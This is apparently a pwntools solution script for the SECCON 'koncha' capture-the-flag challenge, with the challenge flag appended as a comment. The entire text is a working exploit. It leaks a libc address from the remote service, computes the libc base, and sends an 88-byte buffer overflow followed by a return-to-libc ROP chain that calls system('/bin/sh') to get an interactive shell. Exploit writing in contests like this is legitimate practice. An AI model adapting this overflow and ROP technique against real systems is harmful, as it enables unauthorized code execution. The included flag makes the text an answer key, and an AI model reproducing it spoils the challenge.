from pwn import *

e = context.binary = ELF('./chall_patched')
libc = ELF('./libc.so.6')
p = remote("koncha.seccon.games",9001)
#p = gdb.debug(e.path,'c')

p.recv()
p.sendline(b"")
p.recvuntil(b"you, ")
leak = u64(p.recvuntil(b"!",drop=True).ljust(8,b'\x00'))
print(hex(leak))

libc_base = leak - 0x1f12e8
libc.address = libc_base
POP_RDI = libc_base + 0x23b6a
RET = libc_base + 0xc067d

payload = b'A'*88
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.sym.system)

p.recv()
p.sendline(payload)
p.interactive()

## SECCON{I_should_have_checked_the_return_value_of_scanf}
